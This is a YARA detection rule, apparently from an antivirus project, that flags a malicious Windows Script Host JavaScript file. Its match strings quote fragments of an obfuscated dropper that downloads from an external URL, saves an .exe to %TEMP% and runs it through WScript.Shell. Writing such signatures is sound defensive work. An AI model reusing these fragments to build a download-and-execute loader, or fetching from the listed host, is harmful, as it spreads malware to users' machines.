rule sig_20160328_7f393e5c81195fcd4d136fac35119455 {
  meta:
    description = "datamaliciousorder - file 20160328_7f393e5c81195fcd4d136fac35119455.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "95837b804f9c8c35c8ba45b9cbf5124ff32cffa20e3f75a413846d4b057d1175"

  strings:
    $s1  = "function Kotjv() {return Siiaghutqp[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"xdZ0ucZmNHmTbdO9.exe\";};" fullword ascii
    $s2  = "do {WScript[Unpavay](Sdgwrttd() * 11)} while (Chbjvrbgig[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Chbjvrbgig[Brorfjwahp](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s4  = "function Xwhywgmop(Ilroa, Xguivag){return Ilroa - Xguivag;};" fullword ascii
    $s5  = "var Siiaghutqp = function Onzsqvq() {return WScript[Fwiheia](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Pxrna(Ukmmtrv){Siiaghutqp[\"Run\"](Ukmmtrv, Enkdwdbe, Enkdwdbe);};" fullword ascii
    $s7  = "function Prdbo() {return ((Vfcvbvv == true) && (Vfcvbvv == Zpqtr)) ? 1 : Enkdwdbe;};" fullword ascii
    $s8  = "function Ejuctlwlkd(Bsduqxn) {var Mlejpnqw = (1, 2, 3, 4, 5, Bsduqxn); return Mlejpnqw;};" fullword ascii
    $s9  = "function Sdgwrttd(){return 22;};" fullword ascii
    $s10 = "var Vfcvbvv = false;" fullword ascii
    $s11 = "var Zpqtr = false;" fullword ascii
    $s12 = "function Kgrzl()" fullword ascii
    $s13 = "Vfcvbvv = true; " fullword ascii
    $s14 = "function Imsbknf(){return Kbhulrufa;};" fullword ascii
    $s15 = "return Xwhywgmop(Gxzysse, Xscwap);" fullword ascii
    $s16 = "var Qijqbxvtof = new this[\"Date\"]();" fullword ascii
    $s17 = "function Idzissop(){return Fwiheia;};" fullword ascii
    $s18 = " while (Xwzwroie){" fullword ascii
    $s19 = "var Dhmqyto = false;" fullword ascii
    $s20 = "Zpqtr = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}